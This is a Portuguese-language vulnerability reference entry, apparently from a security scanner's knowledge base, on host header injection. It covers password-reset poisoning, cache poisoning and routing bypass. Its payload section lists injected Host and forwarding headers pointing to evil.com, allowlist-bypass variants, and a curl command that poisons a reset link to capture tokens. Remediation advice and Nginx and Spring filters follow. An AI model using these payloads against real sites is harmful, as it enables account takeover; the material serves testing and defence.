---
id: host_header_injection
title: "Host Header Injection"
module: "hostheader"
severity: "HIGH"
cwe_id: "CWE-20"
cwe_title: "Improper Input Validation"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
vrt_id: "server_security_misconfiguration.host_header_injection"
---

## Summary
A aplicação confia no header `Host` (ou em `X-Forwarded-Host`) para gerar links, redirecionamentos e URLs absolutas, permitindo password reset poisoning, cache poisoning, SSRF e bypass de roteamento.

## Description
O header `Host` indica o domínio usado pelo cliente. Atrás de proxies e balanceadores, headers como `X-Forwarded-Host`, `X-Forwarded-Server`, `Forwarded` e `X-Original-URL` podem ser repassados. Quando a aplicação usa esses valores para construir URLs (links de reset, callbacks, webhooks, canonical, redirects) sem validar contra o domínio canônico, o atacante controla o destino.

Cenários clássicos:
- **Password reset poisoning:** o link enviado por e-mail aponta para o host do atacante, que captura o token.
- **Cache poisoning:** resposta com host injetado é cacheada e servida a outras vítimas.
- **SSRF/routing bypass:** proxy usa o header para escolher backend interno.
- **Webhook/callback hijack:** URL de retorno aponta para domínio malicioso.
- **Cookie injection:** `Set-Cookie` com domínio controlado.
- **Virtual host enumeration:** revela vhosts internos e painéis administrativos.

## Impact
- Account takeover via roubo de token de reset de senha.
- Envenenamento de cache e distribuição de conteúdo malicioso.
- Acesso a serviços internos e bypass de regras de proxy/WAF.
- Vazamento de tokens e dados em links/callbacks.
- Impacto HIGH; CRITICAL quando leva a account takeover em massa.

## Payloads and Bypasses
```http
GET /password/reset HTTP/1.1
Host: evil.com
```

```http
POST /password/reset HTTP/1.1
Host: alvo.com
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Forwarded-Proto: https
```

```text
# Headers alternativos
Host: evil.com
Host: alvo.com:443@evil.com
Host: evil.com:443
Host: evil.com#@alvo.com
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Forwarded-Port: 443
X-Forwarded-Proto: http
X-Original-URL: /admin
X-Rewrite-URL: /admin
Forwarded: host=evil.com;proto=https
X-Host: evil.com
X-HTTP-Host-Override: evil.com
```

```text
# Duplicar Host / smuggling de header
Host: alvo.com
Host: evil.com

# Absolute-form request URI
GET https://evil.com/password/reset HTTP/1.1
Host: alvo.com

# Bypass de allowlist
Host: alvo.com.evil.com
Host: evil.com/alvo.com
Host: alvo.com%00.evil.com
Host: alvo.com%2f@evil.com
Host: EVIL.COM
Host: alvo.com:443
```

Teste de password reset:
```bash
curl -s -X POST https://alvo.com/api/password/reset \
  -H 'Host: evil.com' \
  -H 'Content-Type: application/json' \
  -d '{"email":"vitima@exemplo.com"}'
# Verificar o link recebido: https://evil.com/reset?token=...
```

Casos reais e mentalidade de ataque (RWBH): Shopify (password reset poisoning) e Uber (links absolutos) ilustram o desvio de token via `Host`/`X-Forwarded-Host`; o atacante procura fluxos que geram links absolutos e cache.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** headers `Host`, `X-Forwarded-Host`, `X-Forwarded-Server`, `X-Forwarded-Proto`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`, `X-Host`.
- **Paths comuns:** `/password/reset`, `/forgot-password`, `/account/reset`, `/login`, `/redirect`, `/webhook`, `/callback`, `/api/*`, `/admin`.
- **Sinais:** links absolutos gerados com Host; `Location` refletindo Host; cache de páginas com host; vhosts diferentes; erros de proxy.

## Recommendation
1. Validar `Host` contra allowlist de domínios canônicos; rejeitar hosts desconhecidos com 400.
2. Não confiar em `X-Forwarded-Host`/`X-Forwarded-Server` para construir URLs; usar configuração estática (`app.base-url`) ou o host validado.
3. Configurar o proxy para sobrescrever headers de forwarding e não repassar valores do cliente.
4. Gerar links absolutos a partir de configuração confiável, não do request.
5. Em reset de senha, usar token de uso único, curto e vinculado ao usuário; validar o host do link.
6. Aplicar `Vary` e chaves de cache que incluam o host canônico; não cachear respostas com Host refletido.
7. Desabilitar roteamento por `X-Original-URL`/`X-Rewrite-URL` no edge.
8. Exemplo Nginx:
```nginx
server {
    listen 443 ssl;
    server_name alvo.com www.alvo.com;
    if ($host !~ ^(alvo\.com|www\.alvo\.com)$) { return 444; }
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-Host "";
}
```
9. Exemplo Java/Spring:
```java
private static final Set<String> ALLOWED = Set.of("alvo.com", "www.alvo.com");

@Component
public class HostFilter extends OncePerRequestFilter {
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        String host = req.getServerName();
        if (!ALLOWED.contains(host)) { res.sendError(400); return; }
        chain.doFilter(req, res);
    }
}
```
10. Monitorar hosts anômalos, tentativas de reset com Host externo e picos de tokens inválidos.
